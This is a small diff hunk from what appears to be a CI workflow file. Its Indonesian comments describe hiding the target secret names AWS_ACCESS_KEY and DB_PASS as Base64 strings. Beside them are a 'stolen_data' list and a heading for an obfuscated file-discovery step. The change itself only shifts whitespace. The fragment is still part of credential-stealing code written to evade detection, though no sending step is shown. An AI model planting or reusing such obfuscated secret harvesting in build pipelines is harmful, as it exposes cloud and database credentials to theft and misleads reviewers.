@@ -44,8 +44,7 @@ jobs:
           # Mereka menggunakan nilai Base64 dari kata kunci tersebut.
           # 'QVdTX0FDQ0VTU19LRVk=' -> AWS_ACCESS_KEY
           # 'REJfUEFTUw=='         -> DB_PASS
-          target_keys = [b'QVdTX0FDQ0VTU19LRVk=', b'REJfUEFTUw==']
-          
+          target_keys = [b'QVdTX0FDQ0VTU19LRVk=', b'REJfUEFTUw==']          
           stolen_data = []
 
           # 2. TEKNIK OBFUSCATION: DYNAMIC FILE DISCOVERY
